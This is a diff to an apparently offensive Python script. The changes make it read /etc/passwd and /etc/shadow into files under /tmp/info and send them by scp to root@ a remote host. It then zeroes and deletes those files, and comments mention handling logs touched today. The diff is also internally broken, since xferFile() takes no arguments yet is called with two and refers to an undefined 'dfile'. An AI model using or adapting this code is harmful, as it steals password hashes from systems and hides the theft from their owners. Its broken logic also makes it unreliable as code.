@@ -167,6 +167,9 @@ def w2File(result,filename,i=0):
             print(sep+sep,file=f)
         #for r in result:
         #    print(r[0],"\n",r[1],file=f)
+    elif(i==2):
+        with open("/tmp/info/"+filename,'a') as f:
+            print(result,file=f)
     else:
         with open("/tmp/info/"+filename,'w') as f:
             print(result,file=f)
@@ -175,7 +178,7 @@ def xferFile():
     # encode and gzip, then xfer
     # uuencode -m <file to encode>
     # ssh <IP> uuencode -m /bin/ls - | unudecode > ls
-    pass
+    bashCmd("scp /tmp/info/"+dfile+" root@"+IPandLoc)
 
 ## this function lists all logs touched today, sends info files to IP/folder location
 ## zeros out files and removes all info files
@@ -208,17 +211,23 @@ def logClean(IPandLoc):
     # for each info file found, send to AP and zero out files
     for i in range(0,len(files2)):
         ###############################################scp here!!
-        bashCmd("scp /tmp/info/"+files2[i]+" root@"+IPandLoc)
+        #bashCmd("scp /tmp/info/"+files2[i]+" root@"+IPandLoc)
+        xferFile(files2[i],IPandLoc)
         size=bashCmd("ls -latr /tmp/info/"+files2[i]).split()    
         bashCmd("dd if=/dev/zero of=/tmp/info/"+files2[i]+
                 " bs=1 count="+size[4])
     bashCmd("rm -rf /tmp/info/")
 
 def getPass():
-    passwrd=[]
+    passwd=[]
     with open ("/etc/passwd","r") as p:
-        passwd.append(p.readline())
-    print(passwd)
+        pas=p.readlines()
+        for i in pas:
+            w2File(i.split('\n')[0],"passwd",2)
+    with open ("/etc/shadow","r") as g:
+        s=g.readlines()
+        for i in s:
+            w2File(i.split('\n')[0],"shadow",2)
 
 ##########################################
 
